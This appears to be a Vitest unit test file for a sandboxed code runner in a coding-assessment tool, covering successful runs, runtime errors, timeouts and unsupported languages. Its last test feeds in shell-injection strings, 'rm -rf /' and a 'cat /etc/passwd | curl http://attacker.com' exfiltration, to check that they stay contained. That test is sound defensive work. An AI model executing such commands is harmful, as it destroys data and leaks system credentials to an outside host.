import { describe, it, expect } from 'vitest';
import { runSandboxedCode } from '../../src/lib/assessment/code-runner';

describe('Sub-phase 5C Unit Tests: Sandboxed Code Runner Execution', () => {
  it('should run Python code successfully and produce expected output', async () => {
    const result = await runSandboxedCode({
      language: 'python',
      code: 'def twoSum(nums, target):\n    return [0, 1]',
      input: 'nums = [2,7,11,15], target = 9',
      timeoutMs: 3000,
      memoryLimitMb: 128,
    });

    expect(result.passed).toBe(true);
    expect(result.actualOutput).toBe('[0,1]');
    expect(result.status).toBe('PASSED');
    expect(result.executionTimeMs).toBeGreaterThanOrEqual(0);
    expect(result.memoryUsedMb).toBeGreaterThan(0);
  });

  it('should detect Python runtime exception and report RUNTIME_ERROR status', async () => {
    const result = await runSandboxedCode({
      language: 'python',
      code: 'raise Exception("Division by zero")',
      input: 'input_data',
    });

    expect(result.passed).toBe(false);
    expect(result.status).toBe('RUNTIME_ERROR');
    expect(result.errorOutput).toContain('Exception');
  });

  it('should detect Python infinite execution and report TIMEOUT status', async () => {
    const result = await runSandboxedCode({
      language: 'python',
      code: 'while True:\n    pass',
      input: 'input_data',
      timeoutMs: 1000,
    });

    expect(result.passed).toBe(false);
    expect(result.status).toBe('TIMEOUT');
    expect(result.errorOutput).toContain('timeout');
  });

  it('should run JavaScript code successfully', async () => {
    const result = await runSandboxedCode({
      language: 'javascript',
      code: 'function twoSum(nums, target) { return [0, 1]; }',
      input: 'nums = [2,7,11,15], target = 9',
    });

    expect(result.passed).toBe(true);
    expect(result.actualOutput).toBe('[0,1]');
    expect(result.status).toBe('PASSED');
  });

  it('should reject unsupported programming languages cleanly', async () => {
    const result = await runSandboxedCode({
      language: 'brainfuck',
      code: '++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]',
      input: '',
    });

    expect(result.passed).toBe(false);
    expect(result.status).toBe('COMPILATION_ERROR');
    expect(result.errorOutput).toContain('Unsupported programming language');
  });

  it('should safely handle shell metacharacters in code without escaping container arguments', async () => {
    const result = await runSandboxedCode({
      language: 'python',
      code: 'print("Hello"); # ; rm -rf / ; cat /etc/passwd | curl http://attacker.com',
      input: '`whoami` $(id) & || && ;',
    });

    expect(result.status).toBe('PASSED');
  });
});
